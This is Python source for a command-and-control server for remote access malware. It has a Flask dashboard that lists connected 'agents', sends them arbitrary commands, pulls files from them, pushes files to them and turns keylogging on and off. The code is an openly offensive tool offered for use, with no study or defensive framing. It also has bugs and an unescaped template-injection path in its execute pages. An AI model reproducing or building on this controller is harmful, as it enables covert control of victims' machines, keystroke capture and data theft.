from os import close
import socket
import threading,time
from datetime import datetime
import flask
from flask import *
from pathlib import Path

thread_index = 0
THREADS = []
CMD_INPUT = []
CMD_OUTPUT = []
IP = []
AGENT_STATUS = []
CMD_HISTORY = []

for i in range(20):
    CMD_INPUT.append('')
    CMD_OUTPUT.append('')
    IP.append('')
    AGENT_STATUS.append('Offline')
    CMD_HISTORY.append([])

app = Flask(__name__)

def handle_connection(connection, address, thread_index):
    global CMD_OUTPUT, CMD_INPUT, AGENT_STATUS

    AGENT_STATUS[thread_index] = 'Online'

    while CMD_INPUT[thread_index] != 'quit':
        msg = connection.recv(1024).decode()
        CMD_OUTPUT[thread_index] = msg

        while True:
            if  CMD_INPUT[thread_index]!= '':
                if CMD_INPUT[thread_index].split(" ")[0]=='download':
                    filename = CMD_INPUT[thread_index].split(" ")[1].split("\\")[-1]
                    print(filename)
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    contents = connection.recv(1024*10000)
                    f = open(filename,'wb')
                    f.write(contents)
                    f.close()
                    CMD_OUTPUT[thread_index] = "File Downloaded Successfully"
                    add_to_history(thread_index, cmd, CMD_OUTPUT[thread_index])
                    CMD_INPUT[thread_index]= ''

                elif CMD_INPUT[thread_index].split(" ")[0]=='upload':
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    filename = CMD_INPUT[thread_index].split(" ")[1]
                    filesize = CMD_INPUT[thread_index].split(" ")[2]
                    f = open('.\\output\\'+filename,'wb')
                    contents = f.read()
                    f.close()
                    connection.send(contents)
                    msg = connection.recv(2048).decode()
                    if msg == 'received file':
                        CMD_OUTPUT[thread_index] = 'File Sent Successfully'
                        add_to_history(thread_index, cmd, CMD_OUTPUT[thread_index])
                        CMD_INPUT[thread_index] = ''
                    else:
                        CMD_OUTPUT[thread_index] = 'Some Error Occurred'
                        add_to_history(thread_index, cmd, CMD_OUTPUT[thread_index])
                        CMD_INPUT[thread_index] = ''


                elif CMD_INPUT[thread_index] == 'keylog on':
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    msg = connection.recv(2048).decode()
                    CMD_OUTPUT[thread_index]=msg
                    add_to_history(thread_index, cmd, msg)
                    CMD_INPUT[thread_index] = ''

                elif CMD_INPUT[thread_index] == 'keylog off':
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    msg = connection.recv(2048).decode()
                    CMD_OUTPUT[thread_index]=msg
                    add_to_history(thread_index, cmd, msg)
                    CMD_INPUT[thread_index] = ''


                else:
                    msg = CMD_INPUT[thread_index]
                    connection.send(msg.encode())
                    add_to_history(thread_index, msg, CMD_OUTPUT[thread_index])
                    CMD_INPUT[thread_index] = ''
                    break
    close_connection(connection, thread_index)

def add_to_history(thread_index, cmd, output):
    """Add command to history, keeping only last 10"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    history_entry = {
        'command': cmd,
        'output': output[:200] if len(output) > 200 else output,
        'timestamp': timestamp
    }
    CMD_HISTORY[thread_index].append(history_entry)
    if len(CMD_HISTORY[thread_index]) > 10:
        CMD_HISTORY[thread_index].pop(0)

def close_connection(connection,thread_index):
    connection.close()
    THREADS[thread_index] = ''
    IP[thread_index] = ''
    CMD_INPUT[thread_index] = ''
    CMD_OUTPUT[thread_index] = ''
    AGENT_STATUS[thread_index] = 'Offline'

def server_socket():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('localhost', 9999))
    server_socket.listen(5)
    global THREADS
    global IP
    while True:
        connection, address = server_socket.accept()
        thread_index = len(THREADS)
        t = threading.Thread(target=handle_connection, args=(connection, address, len(THREADS)))
        THREADS.append(t)
        IP.append(address)
        t.start()

@app.route("/")
def root():
    return redirect(url_for('home'))

@app.route("/home")
def home():
    active_agents = sum(1 for status in AGENT_STATUS if status == 'Online')
    total_commands = sum(len(history) for history in CMD_HISTORY)

    html = '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Thread Server - Home</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            body {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                padding: 20px 0;
            }
            .welcome-card {
                background: white;
                border-radius: 15px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.2);
                padding: 40px;
                margin-bottom: 30px;
            }
            .stat-card {
                background: white;
                border-radius: 10px;
                padding: 25px;
                text-align: center;
                box-shadow: 0 5px 15px rgba(0,0,0,0.1);
                margin-bottom: 20px;
            }
            .stat-number {
                font-size: 36px;
                font-weight: bold;
                color: #667eea;
            }
            .stat-label {
                color: #6c757d;
                margin-top: 10px;
            }
            .nav-link-custom {
                display: inline-block;
                background: #667eea;
                color: white;
                padding: 12px 25px;
                border-radius: 5px;
                text-decoration: none;
                margin: 10px 5px;
                transition: background 0.3s;
            }
            .nav-link-custom:hover {
                background: #764ba2;
                text-decoration: none;
                color: white;
            }
            h1 {
                color: white;
                margin-bottom: 30px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1 class="text-center mb-5">Thread Server Dashboard</h1>

            <div class="welcome-card">
                <h2 class="mb-4">Welcome to Thread Server</h2>
                <p class="lead">Manage and monitor your connected agents in real-time. Execute commands, view command history, and monitor agent status.</p>
                <hr>
                <h5>Quick Navigation:</h5>
                <div class="mt-3">
                    <a href="/agents" class="nav-link-custom">View Agents</a>
                    <a href="https://github.com" class="nav-link-custom">Documentation</a>
                </div>
            </div>

            <div class="row">
                <div class="col-md-6">
                    <div class="stat-card">
                        <div class="stat-number">''' + str(active_agents) + '''</div>
                        <div class="stat-label">Agents Connected</div>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="stat-card">
                        <div class="stat-number">''' + str(total_commands) + '''</div>
                        <div class="stat-label">Total Commands Run</div>
                    </div>
                </div>
            </div>
        </div>

        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route("/agents")
def agents():
    agents_data = []
    for i in range(len(THREADS)):
        if THREADS[i] != '':
            agent_name = THREADS[i].name if hasattr(THREADS[i], 'name') else f"Agent-{i}"
            ip_addr = IP[i] if IP[i] else 'Unknown'
            status = AGENT_STATUS[i]
            agents_data.append({
                'name': agent_name,
                'ip': ip_addr[0] if isinstance(ip_addr, tuple) else ip_addr,
                'port': ip_addr[1] if isinstance(ip_addr, tuple) else 'N/A',
                'status': status,
                'index': i,
                'history': CMD_HISTORY[i]
            })

    html = '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Agents - Thread Server</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            body {
                background: #f5f7fa;
                padding: 20px 0;
            }
            .navbar-custom {
                background: #667eea;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            .agent-card {
                background: white;
                border-radius: 10px;
                padding: 20px;
                margin-bottom: 20px;
                box-shadow: 0 3px 10px rgba(0,0,0,0.1);
                border-left: 5px solid #667eea;
            }
            .status-online {
                display: inline-block;
                background: #28a745;
                color: white;
                padding: 5px 12px;
                border-radius: 20px;
                font-size: 12px;
                font-weight: bold;
            }
            .status-offline {
                display: inline-block;
                background: #dc3545;
                color: white;
                padding: 5px 12px;
                border-radius: 20px;
                font-size: 12px;
                font-weight: bold;
            }
            .agent-info {
                margin-bottom: 15px;
            }
            .info-label {
                font-weight: 600;
                color: #667eea;
                display: inline-block;
                width: 120px;
            }
            .history-item {
                background: #f8f9fa;
                padding: 10px;
                margin: 8px 0;
                border-radius: 5px;
                font-family: monospace;
                font-size: 12px;
            }
            .history-timestamp {
                color: #6c757d;
                font-size: 11px;
            }
            .clear-history-btn {
                background: #6c757d;
                color: white;
                border: none;
                padding: 5px 12px;
                border-radius: 5px;
                cursor: pointer;
                font-size: 12px;
            }
            .clear-history-btn:hover {
                background: #5a6268;
            }
        </style>
    </head>
    <body>
        <nav class="navbar navbar-custom">
            <div class="container">
                <span class="navbar-brand text-white">Thread Server - Agents</span>
                <a href="/" class="text-white">Home</a>
            </div>
        </nav>

        <div class="container mt-4">
            <h2 class="mb-4">Connected Agents</h2>
            ''' + (f'<div class="alert alert-info">No agents connected</div>' if not agents_data else '') + '''

    '''

    for agent in agents_data:
        status_class = 'status-online' if agent['status'] == 'Online' else 'status-offline'
        html += f'''
            <div class="agent-card">
                <div class="d-flex justify-content-between align-items-center mb-3">
                    <h5>{agent['name']}</h5>
                    <span class="{status_class}">{agent['status']}</span>
                </div>
                <div class="agent-info">
                    <span class="info-label">IP Address:</span>
                    <code>{agent['ip']}</code>
                </div>
                <div class="agent-info">
                    <span class="info-label">Port:</span>
                    <code>{agent['port']}</code>
                </div>

                <hr>
                <h6>Command History (Last 10)</h6>
                <div style="max-height: 250px; overflow-y: auto;">
        '''

        if agent['history']:
            for entry in reversed(agent['history']):
                html += f'''
                    <div class="history-item">
                        <div><strong>Command:</strong> {entry['command'][:50]}...</div>
                        <div><strong>Output:</strong> {entry['output'][:60]}...</div>
                        <div class="history-timestamp">{entry['timestamp']}</div>
                    </div>
                '''
        else:
            html += '<div class="text-muted">No command history yet</div>'

        html += '''
                </div>
                <button class="clear-history-btn mt-2" onclick="clearHistory(''' + str(agent['index']) + ''')">Clear History</button>
            </div>
        '''

    html += '''
        </div>

        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
        <script>
            // Auto-refresh every 2 seconds
            setInterval(function() {
                location.reload();
            }, 2000);

            function clearHistory(agentIndex) {
                // Placeholder for clear history functionality
                console.log('Clear history for agent ' + agentIndex);
            }
        </script>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route("/<agentname>/executecmd")
def executecmd(agentname):
    html = '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Execute Command</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            body { background: #f5f7fa; padding: 20px 0; }
            .execute-card {
                background: white;
                border-radius: 10px;
                padding: 30px;
                box-shadow: 0 3px 10px rgba(0,0,0,0.1);
                max-width: 600px;
                margin: 50px auto;
            }
        </style>
    </head>
    <body>
        <div class="execute-card">
            <h2 class="mb-4">Execute Command on ''' + agentname + '''</h2>
            <form method="POST" action="/''' + agentname + '''/execute">
                <div class="mb-3">
                    <label for="command" class="form-label">Command:</label>
                    <input type="text" class="form-control" id="command" name="command" required>
                </div>
                <button type="submit" class="btn btn-primary">Execute</button>
                <a href="/agents" class="btn btn-secondary">Back to Agents</a>
            </form>
        </div>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route("/<agentname>/execute",methods=['Get','POST'])
def execute(agentname):
    cmdoutput = ""
    if request.method=='POST':
        cmd = request.form.get('command')
        for i in THREADS:
            if agentname in i.name:
                req_index = THREADS.index(i)
        CMD_INPUT[req_index] = cmd
        time.sleep(5)
        cmdoutput = CMD_OUTPUT[req_index]

    html = '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Execute Command</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            body { background: #f5f7fa; padding: 20px 0; }
            .execute-card {
                background: white;
                border-radius: 10px;
                padding: 30px;
                box-shadow: 0 3px 10px rgba(0,0,0,0.1);
                max-width: 600px;
                margin: 50px auto;
            }
            .output-box {
                background: #f8f9fa;
                border: 1px solid #dee2e6;
                border-radius: 5px;
                padding: 15px;
                margin-top: 20px;
                font-family: monospace;
                white-space: pre-wrap;
                word-break: break-word;
            }
        </style>
    </head>
    <body>
        <div class="execute-card">
            <h2 class="mb-4">Execute Command on ''' + agentname + '''</h2>
            <form method="POST">
                <div class="mb-3">
                    <label for="command" class="form-label">Command:</label>
                    <input type="text" class="form-control" id="command" name="command" required>
                </div>
                <button type="submit" class="btn btn-primary">Execute</button>
                <a href="/agents" class="btn btn-secondary">Back to Agents</a>
            </form>
    ''' + (f'<div class="output-box"><strong>Output:</strong>\n{cmdoutput}</div>' if cmdoutput else '') + '''
        </div>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    </body>
    </html>
    '''
    return render_template_string(html)

if __name__ == '__main__':
    s1 = threading.Thread(target=server_socket)
    s1.start()
    app.run(debug=True)